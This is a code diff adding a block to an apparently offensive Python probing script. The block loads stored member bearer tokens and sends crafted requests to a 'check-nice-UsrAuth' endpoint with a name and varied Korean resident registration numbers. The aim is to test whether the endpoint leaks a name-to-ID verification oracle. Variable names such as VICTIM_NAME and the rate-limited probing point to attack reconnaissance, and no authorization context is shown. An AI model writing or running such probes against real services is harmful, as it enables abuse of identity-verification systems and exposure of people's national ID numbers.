@@ -16,6 +16,7 @@ import json
 import os
 import ssl
 import time
+import urllib.parse
 import urllib.request
 
 HERE = os.path.dirname(os.path.abspath(__file__))
@@ -87,6 +88,27 @@ def main():
         st, body = req(m, p, pl, eh)
         log(f"{m} {p[:95]} -> http={st} {body[:200]}")
         time.sleep(PACE)
+
+    # Nice-UsrAuth WITH member token: is it an online name+RRN verify oracle?
+    # Differentials: own-name/bogus-RRN vs own-name/wrong-bday-RRN vs alien-name.
+    try:
+        import tokstore
+        creds = tokstore.load()
+        if creds:
+            c = creds[0]
+            tok_hdr = {"Authorization": "Bearer " + c["token"]}
+            nm = urllib.parse.quote(c.get("name") or VICTIM_NAME)
+            nice_tests = [
+                f"/api/auth/check-nice-UsrAuth?cstNm={nm}&rrNo=7711021000001",
+                f"/api/auth/check-nice-UsrAuth?cstNm={nm}&rrNo=7711022000001",
+                f"/api/auth/check-nice-UsrAuth?cstNm={urllib.parse.quote('김테스트')}&rrNo=7711021000001",
+            ]
+            for p in nice_tests:
+                st, body = req("POST", p, None, tok_hdr)
+                log(f"NICE+TOK {p[:95]} -> http={st} {body[:200]}")
+                time.sleep(PACE)
+    except Exception as e:
+        log(f"NICE+TOK skipped: {repr(e)[:120]}")
     log(f"CALLBACK PROBE DONE budget_left={BUDGET[0]}")
 
 
